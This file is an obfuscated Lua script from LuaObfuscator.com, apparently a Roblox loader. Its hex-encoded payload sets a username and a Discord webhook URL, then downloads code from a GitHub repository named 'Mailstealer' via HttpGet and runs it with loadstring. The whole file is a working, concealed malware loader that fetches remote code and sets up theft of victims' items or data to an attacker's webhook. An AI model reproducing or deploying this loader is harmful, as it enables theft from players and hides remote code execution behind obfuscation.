--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=0;local v82;while true do if (v81==0) then v82=v2(v0(v30,16));if v19 then local v101=v5(v82,v19);v19=nil;return v101;else return v82;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v83=(v31/((5 -(3 + 0))^(v32-(2 -1))))%((3 -1)^(((v33-(2 -(1 -0))) -(v32-(620 -(555 + 64)))) + (932 -((1922 -(68 + 997)) + 74)))) ;return v83-(v83%(569 -(367 + 201))) ;else local v84=927 -(214 + 713) ;local v85;while true do if (v84==((1270 -(226 + 1044)) + 0)) then v85=(1 + 1)^(v32-1) ;return (((v31%(v85 + v85))>=v85) and (878 -(282 + 595))) or (1637 -((6631 -5108) + 114)) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (119 -(32 + 85)) );v18=v18 + 1 + 1 ;return (v36 * 256) + v35 ;end local function v23()local v37=957 -(892 + 65) ;local v38;local v39;local v40;local v41;while true do if (v37==1) then return (v41 * (40022563 -23245347)) + (v40 * (121138 -55602)) + (v39 * ((345 + 124) -213)) + v38 ;end if (v37==(350 -(87 + 263))) then v38,v39,v40,v41=v1(v16,v18,v18 + (183 -((266 -199) + 113)) );v18=v18 + 3 + 1 ;v37=2 -1 ;end end end local function v24()local v42=v23();local v43=v23();local v44=1;local v45=(v20(v43,953 -(802 + 150) ,20) * ((5 -3)^(57 -25))) + v42 ;local v46=v20(v43,(458 -(416 + 26)) + 5 ,(3282 -2254) -(915 + 82) );local v47=((v20(v43,90 -58 )==(1 + 0)) and  -1) or (1 -0) ;if (v46==0) then if (v45==(1187 -(459 + 610 + 118))) then return v47 * (0 -0) ;else local v91=0 -0 ;while true do if (v91==(0 + 0)) then v46=1 -0 ;v44=0 + 0 ;break;end end end elseif (v46==(2838 -(368 + 423))) then return ((v45==0) and (v47 * ((3 -2)/(18 -(10 + 8))))) or (v47 * NaN) ;end return v8(v47,v46-1023 ) * (v44 + (v45/(((12 -5) -5)^52))) ;end local function v25(v48)local v49=0 -0 ;local v50;local v51;while true do if (v49==((1298 -(814 + 45)) -(145 + 293))) then v50=v3(v16,v18,(v18 + v48) -((1061 -630) -(44 + 386)) );v18=v18 + v48 ;v49=2;end if (v49==(1488 -(998 + 488))) then v51={};for v92=1 + 0 , #v50 do v51[v92]=v2(v1(v3(v50,v92,v92)));end v49=3 + 0 ;end if (v49==(775 -(201 + 571))) then return v6(v51);end if (v49==(1138 -(116 + 1022))) then v50=nil;if  not v48 then local v100=0 -0 ;while true do if (v100==0) then v48=v23();if (v48==(0 + 0)) then return "";end break;end end end v49=3 -(1 + 1) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0 -0 ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v52==2) then v57=nil;v58=nil;v52=3;end if (v52~=(3 + 0)) then else v59=nil;while true do local v94=0;local v95;while true do if (v94==0) then v95=0;while true do if (v95~=0) then else local v108=0 -0 ;while true do if (1~=v108) then else v95=2 -1 ;break;end if ((1700 -(1419 + 281))==v108) then if (1~=v53) then else local v165=0 -0 ;while true do if (v165~=(75 -(71 + 3))) then else for v175=1 + 0 ,v58 do local v176=0;local v177;local v178;local v179;while true do if (v176==(2 -1)) then v179=nil;while true do if (v177~=(0 -0)) then else local v187=0;local v188;while true do if (v187==(241 -(187 + 54))) then v188=780 -(162 + 618) ;while true do if (v188==0) then local v192=0 + 0 ;while true do if (1==v192) then v188=1 + 0 ;break;end if ((0 -0)==v192) then v178=v21();v179=nil;v192=1 -0 ;end end end if (1==v188) then v177=1 + 0 ;break;end end break;end end end if (v177==1) then if (v178==(1637 -(1373 + 263))) then v179=v21()~=(1000 -(451 + 549)) ;elseif (v178==(1 + 1)) then v179=v24();elseif (v178~=(4 -1)) then else v179=v25();end v59[v175]=v179;break;end end break;end if (v176==0) then v177=0 -0 ;v178=nil;v176=1385 -(746 + 638) ;end end end v57[3]=v21();v165=2;end if (v165==(1 + 1)) then v53=2;break;end if (v165==0) then v58=v23();v59={};v165=1;end end end if (v53==2) then for v166=1 -0 ,v23() do local v167=341 -(218 + 123) ;local v168;local v169;while true do if (1==v167) then while true do if ((1581 -(1535 + 46))==v168) then v169=v21();if (v20(v169,1,1 + 0 )~=0) then else local v181=0 + 0 ;local v182;local v183;local v184;local v185;local v186;while true do if (v181==0) then v182=0;v183=nil;v181=561 -(306 + 254) ;end if (v181~=1) then else v184=nil;v185=nil;v181=1 + 1 ;end if (v181~=(3 -1)) then else v186=nil;while true do if ((1469 -(899 + 568))==v182) then while true do if (v183~=(2 + 0)) then else local v193=0;local v194;while true do if (v193==0) then v194=0;while true do if (v194==1) then v183=3;break;end if (v194==0) then if (v20(v185,1,1)==(2 -1)) then v186[605 -(268 + 335) ]=v59[v186[2]];end if (v20(v185,292 -(60 + 230) ,574 -(426 + 146) )~=1) then else v186[3]=v59[v186[1 + 2 ]];end v194=1457 -(282 + 1174) ;end end break;end end end if (3~=v183) then else if (v20(v185,3,3)~=(812 -(569 + 242))) then else v186[4]=v59[v186[11 -7 ]];end v54[v166]=v186;break;end if (v183==0) then local v196=0;local v197;while true do if (v196==0) then v197=0;while true do if (v197~=(1 + 0)) then else v183=1025 -(706 + 318) ;break;end if (v197==(1251 -(721 + 530))) then local v204=0;while true do if (v204==1) then v197=1;break;end if (v204==0) then v184=v20(v169,1273 -(945 + 326) ,3);v185=v20(v169,4,6);v204=1;end end end end break;end end end if (v183~=1) then else local v198=0;while true do if (v198==1) then v183=4 -2 ;break;end if (v198==(0 + 0)) then v186={v22(),v22(),nil,nil};if (v184==(1500 -(1408 + 92))) then local v201=1086 -(461 + 625) ;local v202;local v203;while true do if ((1289 -(993 + 295))==v201) then while true do if (v202~=(0 + 0)) then else v203=0;while true do if (v203==(1171 -(418 + 753))) then v186[2 + 1 ]=v22();v186[1 + 3 ]=v22();break;end end break;end end break;end if (v201~=0) then else v202=0;v203=nil;v201=1 + 0 ;end end elseif (v184==(1 + 0)) then v186[532 -(406 + 123) ]=v23();elseif (v184==2) then v186[3]=v23() -(2^16) ;elseif (v184~=3) then else local v211=1769 -(1749 + 20) ;local v212;local v213;while true do if (v211==(1 + 0)) then while true do if (v212==0) then v213=1322 -(1249 + 73) ;while true do if (v213==(0 + 0)) then v186[1148 -(466 + 679) ]=v23() -(2^(38 -22)) ;v186[11 -7 ]=v22();break;end end break;end end break;end if (v211~=(1900 -(106 + 1794))) then else v212=0 + 0 ;v213=nil;v211=1;end end end v198=1 + 0 ;end end end end break;end if (v182==(0 -0)) then local v190=0 -0 ;while true do if (v190~=0) then else v183=0;v184=nil;v190=1;end if (v190~=(115 -(4 + 110))) then else v182=585 -(57 + 527) ;break;end end end if (v182==1) then local v191=0;while true do if (v191==(1428 -(41 + 1386))) then v182=2;break;end if (v191==(103 -(17 + 86))) then v185=nil;v186=nil;v191=1 + 0 ;end end end end break;end end end break;end end break;end if (v167~=0) then else local v180=0 -0 ;while true do if ((2 -1)==v180) then v167=167 -(122 + 44) ;break;end if (v180==(0 -0)) then v168=0;v169=nil;v180=1;end end end end end for v170=3 -2 ,v23() do v55[v170-(1 + 0) ]=v28();end return v57;end v108=1;end end end if (1==v95) then if (v53==0) then local v130=0 + 0 ;while true do if (v130==(0 -0)) then v54={};v55={};v130=1;end if (v130==1) then v56={};v57={v54,v55,nil,v56};v130=2;end if (v130~=(1259 -(1043 + 214))) then else v53=3 -2 ;break;end end end break;end end break;end end end break;end if (v52~=1) then else local v89=1212 -(323 + 889) ;while true do if (v89~=(2 -1)) then else v52=2;break;end if (v89==(580 -(361 + 219))) then v55=nil;v56=nil;v89=1;end end end if (0==v52) then local v90=320 -(53 + 267) ;while true do if (v90~=(0 + 0)) then else v53=413 -(15 + 398) ;v54=nil;v90=983 -(18 + 964) ;end if ((3 -2)~=v90) then else v52=1 + 0 ;break;end end end end end local function v29(v60,v61,v62)local v63=v60[1];local v64=v60[2];local v65=v60[3];return function(...)local v66=v63;local v67=v64;local v68=v65;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v86=0,v74 do if (v86>=v68) then v72[v86-v68 ]=v73[v86 + 1 ];else v76[v86]=v73[v86 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1];if (v79<=5) then if (v79<=2) then if (v79<=0) then v76[v78[2]]();elseif (v79==1) then v76[v78[2]]=v62[v78[3]];else local v111=0;local v112;local v113;local v114;local v115;while true do if (v111==1) then v71=(v114 + v112) -1 ;v115=0;v111=2;end if (v111==0) then v112=v78[2];v113,v114=v69(v76[v112](v13(v76,v112 + 1 ,v78[3])));v111=1;end if (v111==2) then for v160=v112,v71 do v115=v115 + 1 ;v76[v160]=v113[v115];end break;end end end elseif (v79<=3) then v62[v78[3]]=v76[v78[2]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v62[v78[3]]=v76[v78[2]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v70=v78[3];elseif (v79>4) then v70=v78[3];else local v117=0;local v118;local v119;while true do if (v117==1) then v76[v118 + 1 ]=v119;v76[v118]=v119[v78[4]];break;end if (v117==0) then v118=v78[2];v119=v76[v78[3]];v117=1;end end end elseif (v79<=8) then if (v79<=6) then do return;end elseif (v79>7) then v76[v78[2]]=v78[3];elseif (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end elseif (v79<=9) then v62[v78[3]]=v76[v78[2]];elseif (v79==10) then local v122=v78[2];v76[v122]=v76[v122](v13(v76,v122 + 1 ,v71));else local v124=0;local v125;local v126;local v127;local v128;local v129;while true do if (v124==4) then v76[v129]=v128[v78[4]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3];v124=5;end if (v124==1) then v62[v78[3]]=v76[v78[2]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v62[v78[3]];v124=2;end if (v124==3) then v78=v66[v70];v129=v78[2];v128=v76[v78[3]];v76[v129 + 1 ]=v128;v124=4;end if (v124==9) then v70=v78[3];break;end if (v124==8) then v78=v66[v70];v76[v78[2]]();v70=v70 + 1 ;v78=v66[v70];v124=9;end if (v124==6) then v71=(v127 + v129) -1 ;v125=0;for v163=v129,v71 do local v164=0;while true do if (v164==0) then v125=v125 + 1 ;v76[v163]=v126[v125];break;end end end v70=v70 + 1 ;v124=7;end if (v124==0) then v125=nil;v126,v127=nil;v128=nil;v129=nil;v124=1;end if (5==v124) then v70=v70 + 1 ;v78=v66[v70];v129=v78[2];v126,v127=v69(v76[v129](v13(v76,v129 + 1 ,v78[3])));v124=6;end if (v124==2) then v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v62[v78[3]];v70=v70 + 1 ;v124=3;end if (7==v124) then v78=v66[v70];v129=v78[2];v76[v129]=v76[v129](v13(v76,v129 + 1 ,v71));v70=v70 + 1 ;v124=8;end end end v70=v70 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F03093O00557365724E616D6532030C3O007269705F6A616D6573323436030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F45676F72696B7573612F4D61696C737465616C65722F6D61696E2F656E67696E6503083O00557365724E616D6503073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31353239372O3237323037322O36373134362F2D47566D53746677612O7669735A424C513443485A4636513263652D5372577A504449383630526D6656474563754D61774F65473946416E3944435A306F33776C456E6700163O0012083O00013O0026073O000D000100020004053O000D0001001208000100043O00120B000100033O00122O000100053O00122O000200063O00202O00020002000700122O000400086O000200046O00013O00024O00010001000100044O001500010026073O0001000100010004053O00010001001208000100043O001203000100093O00122O0001000B3O00122O0001000A3O00124O00023O00044O000100012O00063O00017O00",v9(),...);